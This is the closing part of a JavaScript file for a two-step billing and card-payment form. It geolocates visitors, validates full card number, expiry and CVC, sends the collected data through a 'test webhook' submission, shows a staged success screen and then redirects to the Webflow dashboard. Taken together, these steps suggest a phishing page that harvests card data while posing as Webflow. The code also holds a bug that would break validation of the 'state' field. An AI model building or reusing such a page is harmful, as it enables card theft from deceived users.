  function normalizeLanguage(value) {
    if (!value) return null;
    const code = value.toLowerCase().split("-")[0];
    return TRANSLATIONS[code] ? code : null;
  }

  function setLanguage(lang) {
    const locale = normalizeLanguage(lang) || "en";
    CURRENT_LANGUAGE = locale;
    const t = TRANSLATIONS[locale];

    document.documentElement.lang = locale;
    document.documentElement.dir = ["ar", "he"].includes(locale) ? "rtl" : "ltr";
    document.title = t.title;

    document.querySelector('#step1 h1').textContent = t.billingTitle;
    document.querySelector('#step1 .sub').textContent = t.billingSub;
    document.querySelector('#step2 h1').textContent = t.paymentTitle;
    document.querySelector('#step2 .sub').textContent = t.paymentSub;

    const map = {
      name: ["fullName", "fullNamePlaceholder"],
      address: ["address1", "address1Placeholder"],
      address2: ["address2", "address2Placeholder"],
      city: ["city", "cityPlaceholder"],
      state: ["state", "statePlaceholder"],
      postal: ["postal", "postalPlaceholder"],
      card: ["card", "cardPlaceholder"],
      expiry: ["expiry", "expiryPlaceholder"],
      cvc: ["cvc", "cvcPlaceholder"]
    };

    for (const [id, [labelKey, placeholderKey]] of Object.entries(map)) {
      const input = document.getElementById(id);
      if (!input) continue;
      const label = document.querySelector(`label[for="${id}"]`);
      if (label) label.textContent = t[labelKey];
      input.placeholder = t[placeholderKey];
    }

    document.getElementById('continueButton').textContent = t.continue;
    document.getElementById('back').textContent = t.back;
    document.getElementById('saveButton').textContent = t.save;
    document.querySelector('.cancel-link').textContent = t.cancel;
    document.querySelector('.payment-consent').textContent = t.consent;
  }

  function trError(key) {
    return TRANSLATIONS[CURRENT_LANGUAGE].errors[key];
  }

  async function detectLanguage() {
    const browser = normalizeLanguage(
      navigator.languages?.find(Boolean) || navigator.language
    );

    if (browser) {
      setLanguage(browser);
      return;
    }

    try {
      const response = await fetch("https://ipapi.co/json/", {
        method: "GET",
        cache: "no-store"
      });
      if (response.ok) {
        const info = await response.json();
        setLanguage(COUNTRY_LANGUAGE[info.country_code] || "en");
        return;
      }
    } catch (_) {}

    setLanguage("en");
  }

  const CARD_ERROR_ICON = `<svg fill="currentColor" height="20" role="presentation" viewbox="0 0 30 20" width="30" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_184_11820)"><path d="M26.2061 0.00488281C28.3194 0.112115 30 1.85996 30 4V13.335L28.5 10.623V8H27.0488L25.9736 6.05664C25.744 5.64161 25.4595 5.2894 25.1367 5H28.5V4C28.5 2.61929 27.3807 1.5 26 1.5H4C2.61929 1.5 1.5 2.61929 1.5 4V5H19.8643C19.608 5.22972 19.3755 5.49872 19.1758 5.80762L19.0264 6.05664L17.9512 8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H13.0371C13.1062 19.0302 13.2775 19.5408 13.5391 20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H26L26.2061 0.00488281Z" opacity="0.74"></path><path clip-rule="evenodd" d="M20.7762 7.0252C21.5325 5.65827 23.4673 5.65826 24.2235 7.0252L29.743 17.0027C30.4843 18.3434 29.5319 19.9995 28.0194 19.9998H16.9803C15.4679 19.9995 14.5155 18.3434 15.2567 17.0027L20.7762 7.0252ZM22.4999 15.4998C21.8095 15.4998 21.2499 16.0595 21.2499 16.7498C21.2499 17.4402 21.8095 17.9998 22.4999 17.9998C23.1902 17.9998 23.7499 17.4402 23.7499 16.7498C23.7499 16.0595 23.1902 15.4998 22.4999 15.4998ZM22.4999 8.99981C21.9476 8.99981 21.4999 9.44753 21.4999 9.99981V12.9998C21.4999 13.5521 21.9476 13.9998 22.4999 13.9998C23.0522 13.9998 23.4999 13.5521 23.4999 12.9998V9.99981C23.4999 9.44753 23.0522 8.99981 22.4999 8.99981Z" fill-rule="evenodd"></path></g><defs><clippath id="clip0_184_11820"><rect height="20" width="30"></rect></clippath></defs></svg>`;
  const CVC_ICON = `<svg class="p-CardCvcIcons-svg" fill="currentColor" height="20" role="img" viewbox="0 0 30 20" width="30" xmlns="http://www.w3.org/2000/svg"><title id="cvcIconTitle">Credit or debit card CVC</title><g opacity="0.74"><path clip-rule="evenodd" d="M25.2061 0.00488281C27.3194 0.112115 29 1.85996 29 4V11.3291C28.5428 11.0304 28.0336 10.8304 27.5 10.7188V8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H10.1104V20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H25L25.2061 0.00488281ZM4 1.5C2.61929 1.5 1.5 2.61929 1.5 4V5H27.5V4C27.5 2.61929 26.3807 1.5 25 1.5H4Z" fill-rule="evenodd"></path><path d="M27.5 12.7988C28.3058 13.1128 28.7725 13.7946 28.7725 14.6406C28.7722 15.4002 28.2721 15.9399 27.6523 16.1699C28.1601 16.3319 28.6072 16.6732 28.8086 17.2207C28.3597 18.6222 27.1605 19.6862 25.6826 19.9404C24.8389 19.7707 24.1662 19.2842 23.834 18.5H25C25.0914 18.5 25.1816 18.4939 25.2705 18.4844C25.5434 18.7862 25.9284 18.9501 26.3623 18.9502C27.142 18.9501 27.6922 18.5297 27.6924 17.79C27.6923 17.4212 27.5473 17.1544 27.2998 16.9795C27.4281 16.6786 27.5 16.3478 27.5 16V15.0527C27.5397 14.9481 27.5625 14.8309 27.5625 14.7002C27.5625 14.5657 27.5399 14.4422 27.5 14.3311V12.7988Z"></path><path d="M15.2207 18.5V18.8301H16.8799V19.9004H12.1104V18.8301H13.9902V18.5H15.2207Z"></path><path d="M19.9307 18.5L19.5762 18.7803H22.8369V19.9004H17.8164V18.8604L18.2549 18.5H19.9307Z"></path></g><path d="M26.3822 20.01C24.9722 20.01 23.8522 19.25 23.6422 17.81L24.8722 17.58C24.9922 18.45 25.6022 18.95 26.3622 18.95C27.1422 18.95 27.6922 18.53 27.6922 17.79C27.6922 17.05 27.1122 16.72 26.2822 16.72H25.5722V15.67H26.3022C27.0622 15.67 27.5622 15.34 27.5622 14.7C27.5622 14.07 27.1022 13.68 26.3922 13.68C25.6422 13.68 25.1322 14.18 24.9822 14.92L23.8122 14.76C24.0022 13.55 24.9822 12.61 26.4322 12.61C27.8822 12.61 28.7722 13.47 28.7722 14.64C28.7722 15.4 28.2722 15.94 27.6522 16.17C28.3422 16.39 28.9222 16.94 28.9222 17.89C28.9222 19.04 27.9522 20.01 26.3822 20.01Z"></path><path d="M17.8161 18.86L19.6161 17.38C20.5961 16.58 21.4761 15.87 21.4761 14.97C21.4761 14.23 21.0161 13.7 20.2561 13.7C19.5061 13.7 19.0161 14.29 19.0161 15C19.0161 15.23 19.0561 15.46 19.1361 15.68H17.9461C17.8461 15.39 17.8161 15.2 17.8161 14.93C17.8161 13.58 18.9261 12.61 20.2861 12.61C21.7861 12.61 22.7461 13.54 22.7461 14.89C22.7461 16.16 21.7861 17.03 20.7761 17.83L19.5761 18.78H22.8361V19.9H17.8161V18.86Z"></path><path d="M14.25 12.67H15.22V18.83H16.88V19.9H12.11V18.83H13.99V14.92H12.15V13.99L12.88 13.93C13.78 13.86 14.18 13.58 14.25 12.67Z"></path></svg>`;

  const billingFields = [
    ['name', value => value.trim().length >= 2, () => trError('fullName')],
    ['address', value => value.trim().length >= 3, () => trError('address')],
    ['city', value => value.trim().length >= 2, () => trError('city')],
    ['state', value => value.trim().length >= 2, 'Enter your state or province.'],
    ['postal', value => /^[0-9A-Za-z][0-9A-Za-z -]{2,9}$/.test(value), () => trError('postal')]
  ];

  let currentStep = 1;
  let busy = false;

  function setButtonEnabled(button, enabled) {
    button.disabled = !enabled;
  }

  function setFieldState(input, state, message = '') {
    const field = input.closest('.field');
    const error = field?.querySelector('.error-text');
    if (!field || !error) return;

    field.classList.add('touched');
    field.classList.toggle('error', state === 'error');
    field.classList.remove('success');
    error.textContent = message;
    input.setAttribute('aria-invalid', state === 'error' ? 'true' : 'false');
  }

  function validateBilling() {
    let valid = true;
    let firstInvalid = null;

    for (const [id, validator, message] of billingFields) {
      const input = document.getElementById(id);
      const ok = validator(input.value.trim());

      if (!ok) {
        valid = false;
        if (input.closest('.field')?.classList.contains('touched')) {
          setFieldState(input, 'error', message());
        }
        firstInvalid ||= input;
      } else {
        if (input.closest('.field')?.classList.contains('error')) {
          setFieldState(input, 'valid', '');
        }
      }
    }

    setButtonEnabled(continueButton, valid && !busy);

    if (!valid && firstInvalid && document.getElementById('billingForm')?.dataset.submitted === 'true') {
      setFieldState(
        firstInvalid,
        'error',
        billingFields.find(([id]) => id === firstInvalid.id)[2]()
      );
      firstInvalid.focus();
    }

    return valid;
  }

  function digitsOnly(value) {
    return value.replace(/\D/g, '');
  }

  function luhnCheck(value) {
    const digits = digitsOnly(value);
    if (digits.length < 13 || digits.length > 19) return false;

    let sum = 0;
    let doubleDigit = false;

    for (let i = digits.length - 1; i >= 0; i--) {
      let n = Number(digits[i]);
      if (doubleDigit) {
        n *= 2;
        if (n > 9) n -= 9;
      }
      sum += n;
      doubleDigit = !doubleDigit;
    }

    return sum % 10 === 0;
  }

  function detectCardBrand(digits) {
    if (/^4/.test(digits)) return 'visa';
    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'mastercard';
    if (/^(34|37)/.test(digits)) return 'amex';
    if (/^(6011|65|64[4-9])/.test(digits)) return 'discover';
    return null;
  }

  function renderCardIcon(state = 'brand', digits = '') {
    if (state === 'error') {
      cardIcon.className = 'payment-field-icon card-icons error';
      cardIcon.innerHTML = CARD_ERROR_ICON;
      return;
    }

    const brand = detectCardBrand(digits);

    if (!digits) {
      cardIcon.className = 'payment-field-icon card-icons default-group';
      cardIcon.innerHTML = DEFAULT_CARD_ICONS;
      return;
    }

    cardIcon.className = 'payment-field-icon card-icons';

    if (brand === 'visa') {
      cardIcon.innerHTML = CARD_ICONS.visa;
    } else if (brand === 'mastercard') {
      cardIcon.innerHTML = CARD_ICONS.mastercard;
    } else if (brand === 'discover') {
      cardIcon.innerHTML = CARD_ICONS.discover;
    } else if (brand === 'amex') {
      cardIcon.innerHTML = `<svg class="card-brand-svg amex-card-svg" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <rect width="24" height="16" rx="2" fill="#2E77BC"/>
        <rect x="1.5" y="1.5" width="21" height="13" rx="1" stroke="#fff" stroke-opacity=".28"/>
        <path d="M3.5 5.1H6.1L6.55 6.15L7 5.1H9.7V10.9H7.95V7.45L6.75 9.95H6.1L4.9 7.45V10.9H3.5V5.1ZM10.35 5.1H15.15V6.25H12.1V7.3H14.85V8.45H12.1V9.75H15.25V10.9H10.35V5.1ZM15.3 5.1H17L17.9 6.6L18.8 5.1H20.5L18.75 7.95L20.6 10.9H18.9L17.9 9.25L16.9 10.9H15.2L17.05 7.95L15.3 5.1ZM20.75 5.1H22V10.9H20.75V5.1Z" fill="#fff"/>
      </svg>`;
    } else {
      // Keep the neutral brand set while there is not enough information
      // to identify a card network.
      cardIcon.className = 'payment-field-icon card-icons default-group';
      cardIcon.innerHTML = DEFAULT_CARD_ICONS;
    }
  }

  function renderCvcIcon(state = 'default') {
    if (state === 'error') {
      cvcIcon.className = 'payment-field-icon cvc-icons error';
      cvcIcon.innerHTML = CARD_ERROR_ICON;
      return;
    }

    cvcIcon.className = 'payment-field-icon cvc-icons cvc-default';
    cvcIcon.innerHTML = CVC_ICON;
  }

  function validateCard() {
    const digits = digitsOnly(cardInput.value);

    if (!digits) {
      setFieldState(cardInput, 'error', trError('cardEmpty'));
      renderCardIcon('error', digits);
      return false;
    }
    if (digits.length < 13) {
      setFieldState(cardInput, 'error', trError('cardIncomplete'));
      renderCardIcon('error', digits);
      return false;
    }
    if (!luhnCheck(digits)) {
      setFieldState(cardInput, 'error', trError('cardInvalid'));
      renderCardIcon('error', digits);
      return false;
    }

    setFieldState(cardInput, 'valid', '');
    renderCardIcon('brand', digits);
    return true;
  }

  function validateExpiry() {
    const value = expiryInput.value.trim();
    const match = value.match(/^(\d{2})\/(\d{2})$/);

    if (!match) {
      setFieldState(expiryInput, 'error', trError('expiryInvalid'));
      return false;
    }

    const month = Number(match[1]);
    const year = Number(match[2]);
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;

    if (month < 1 || month > 12) {
      setFieldState(expiryInput, 'error', trError('expiryMonth'));
      return false;
    }

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      setFieldState(expiryInput, 'error', trError('expiryInvalid'));
      return false;
    }

    setFieldState(expiryInput, 'valid', '');
    return true;
  }

  function validateCvc() {
    const digits = digitsOnly(cvcInput.value);

    if (digits.length < 3) {
      setFieldState(cvcInput, 'error', trError('cvc'));
      renderCvcIcon('error');
      return false;
    }

    setFieldState(cvcInput, 'valid', '');
    renderCvcIcon('default');
    return true;
  }

  function showStep(step) {
    currentStep = step;
    indicator.innerHTML = `<span class="step-current">Step ${step}</span><span class="step-rest">of 2</span>`;
    indicator.setAttribute('aria-label', `Step ${step} of 2`);
    progress.style.width = step === 1 ? '50%' : '100%';
    loader.classList.add('hidden');
    step1.classList.toggle('hidden', step !== 1);
    step2.classList.toggle('hidden', step !== 2);
    success.classList.remove('show');
    success.style.display = 'none';
    spinner.style.display = 'block';
    busy = false;

    if (step === 2) {
      renderCardIcon('brand', digitsOnly(cardInput.value));
      renderCvcIcon('default');
    }

    if (step === 1) {
      setButtonEnabled(continueButton, billingFields.every(([id, validator]) =>
        validator(document.getElementById(id).value.trim())
      ));
    } else {
      updateSaveButton();
    }
  }

  function showLoader() {
    setButtonEnabled(continueButton, false);
    setButtonEnabled(saveButton, false);
    step1.classList.add('hidden');
    step2.classList.add('hidden');
    success.classList.remove('show');
    success.style.display = 'none';
    spinner.style.display = 'block';
    loader.classList.remove('hidden');
    loader.setAttribute('aria-busy', 'true');
  }

  function transitionToStep(step, delay = 1000) {
    if (busy) return;
    busy = true;
    showLoader();

    window.setTimeout(() => {
      loader.classList.add('hidden');
      loader.setAttribute('aria-busy', 'false');
      showStep(step);
    }, delay);
  }


  // Enter moves to the next visible input.
  // On the last input of each step, Enter activates that step's button.
  const enterSequences = {
    billing: ['name', 'address', 'address2', 'city', 'state', 'postal'],
    payment: ['card', 'expiry', 'cvc']
  };

  function getCurrentEnterSequence() {
    return currentStep === 1 ? enterSequences.billing : enterSequences.payment;
  }

  Object.values(enterSequences).flat().forEach(id => {
    const input = document.getElementById(id);
    if (!input) return;

    input.addEventListener('keydown', e => {
      if (e.key !== 'Enter' || e.isComposing) return;

      e.preventDefault();

      const sequence = getCurrentEnterSequence();
      const index = sequence.indexOf(id);
      if (index === -1) return;

      // Find the next available field in the current step.
      for (let i = index + 1; i < sequence.length; i++) {
        const next = document.getElementById(sequence[i]);
        const field = next?.closest('.field');

        if (
          next &&
          !next.disabled &&
          !field?.classList.contains('hidden') &&
          !field?.closest('.hidden')
        ) {
          next.focus();
          return;
        }
      }

      // Last field: activate Continue on billing or Save on payment.
      const actionButton = currentStep === 1 ? continueButton : saveButton;

      if (actionButton && !actionButton.disabled && !busy) {
        actionButton.click();
      }
    });
  });

  // Billing field UX.
  billingFields.forEach(([id, validator, message]) => {
    const input = document.getElementById(id);

    input.addEventListener('blur', () => {
      input.closest('.field')?.classList.add('touched');
      if (!validator(input.value.trim())) {
        setFieldState(input, 'error', message());
      } else {
        setFieldState(input, 'valid', '');
      }
      validateBilling();
    });

    input.addEventListener('input', () => {
      if (input.closest('.field')?.classList.contains('touched')) {
        if (validator(input.value.trim())) {
          setFieldState(input, 'valid', '');
        } else {
          setFieldState(input, 'error', message());
        }
      }
      validateBilling();
    });
  });

  function updateSaveButton() {
    const billingOK = billingFields.every(([id, validator]) =>
      validator(document.getElementById(id).value.trim())
    );

    const cardDigits = digitsOnly(cardInput.value);
    const cardOK = cardDigits.length >= 13 && cardDigits.length <= 19;

    const expiryMatch = expiryInput.value.trim().match(/^(\d{2})\/(\d{2})$/);
    let expiryOK = false;

    if (expiryMatch) {
      const month = Number(expiryMatch[1]);
      const year = Number(expiryMatch[2]);
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;

      expiryOK =
        month >= 1 &&
        month <= 12 &&
        (year > currentYear || (year === currentYear && month >= currentMonth));
    }

    const cvcOK = digitsOnly(cvcInput.value).length >= 3;

    setButtonEnabled(
      saveButton,
      billingOK && cardOK && expiryOK && cvcOK && !busy
    );
  }

  // Card input UX.
  cardInput.addEventListener('input', () => {
    const digits = digitsOnly(cardInput.value).slice(0, 19);
    cardInput.value = digits.replace(/(.{4})/g, '$1 ').trim();

    // While typing, show the detected card brand rather than the error icon.
    if (!cardInput.closest('.field')?.classList.contains('touched')) {
      renderCardIcon('brand', digits);
    } else {
      validateCard();
    }
    updateSaveButton();
  });

  cardInput.addEventListener('blur', () => { validateCard(); updateSaveButton(); });

  // Expiry input UX.
  function formatExpiry(value) {
    let v = value.replace(/[^\d/]/g, '').replace(/\/+/g, '/');

    v = v
      .replace(/^([1-9]\/|[2-9])$/g, '0$1/')
      .replace(/^(0[1-9]|1[0-2])$/g, '$1/')
      .replace(/^([0-1])([3-9])$/g, '0$1/$2')
      .replace(/^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2')
      .replace(/^([0]+)\/|[0]+$/g, '0')
      .replace(/[^\d\/]|^[\/]*$/g, '')
      .replace(/\/\//g, '/');

    return v.slice(0, 5);
  }

  expiryInput.addEventListener('input', () => {
    expiryInput.value = formatExpiry(expiryInput.value);
    if (expiryInput.closest('.field')?.classList.contains('touched')) validateExpiry();
    updateSaveButton();
  });

  expiryInput.addEventListener('keydown', e => {
    if (['Backspace', 'Delete'].includes(e.key)) {
      const start = expiryInput.selectionStart ?? 0;
      const end = expiryInput.selectionEnd ?? 0;
      const value = expiryInput.value;

      // When the caret is at the end of "MM/", don't let the formatter
      // immediately recreate the slash. Treat it like a real backspace.
      if (
        e.key === 'Backspace' &&
        start === value.length &&
        end === value.length &&
        value.endsWith('/')
      ) {
        e.preventDefault();
        expiryInput.value = value.slice(0, -2);
        updateSaveButton();
        return;
      }

      return;
    }

    if (['Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End'].includes(e.key)) return;

    if (!/^\d$/.test(e.key) && e.key !== '/') {
      e.preventDefault();
    }
  });

  expiryInput.addEventListener('blur', () => { validateExpiry(); updateSaveButton(); });

  // CVC input UX.
  cvcInput.addEventListener('input', () => {
    cvcInput.value = digitsOnly(cvcInput.value).slice(0, 4);
    if (cvcInput.closest('.field')?.classList.contains('touched')) validateCvc();
    else renderCvcIcon('default');
    updateSaveButton();
  });

  cvcInput.addEventListener('blur', () => { validateCvc(); updateSaveButton(); });

  // Step 1 -> Step 2.
  billingForm.addEventListener('submit', e => {
    e.preventDefault();
    if (busy) return;

    billingForm.dataset.submitted = 'true';
    if (!validateBilling()) return;
    transitionToStep(2, 1800);
  });

  // Back -> Step 1.
  backButton.addEventListener('click', () => {
    if (busy) return;
    showStep(1);
    window.scrollTo({top: 0, behavior: 'smooth'});
  });

  // Final submission.
  paymentForm.addEventListener('submit', async e => {
    e.preventDefault();
    if (busy) return;

    const billingOK = validateBilling();
    const cardOK = validateCard();
    const expiryOK = validateExpiry();
    const cvcOK = validateCvc();

    if (!billingOK || !cardOK || !expiryOK || !cvcOK) {
      if (!billingOK) showStep(1);
      return;
    }

    busy = true;

    try {
      await sendTestSubmission();
    } catch (error) {
      console.error("Test webhook submission failed:", error);
      busy = false;
      showStep(2);
      return;
    }

    showLoader();

    window.setTimeout(() => {
      spinner.style.display = 'none';
      success.style.display = 'flex';
      success.classList.add('show');
      loader.setAttribute('aria-busy', 'false');

      window.setTimeout(() => {
        window.location.href = 'https://webflow.com/dashboard';
      }, 750);
    }, 3200);
  });

  renderCardIcon('brand', '');
  renderCvcIcon('default');

  // Initial page load: ONE loader, then Billing. Header is untouched.
  showLoader();
  window.setTimeout(() => showStep(1), 1800);
});
</script>
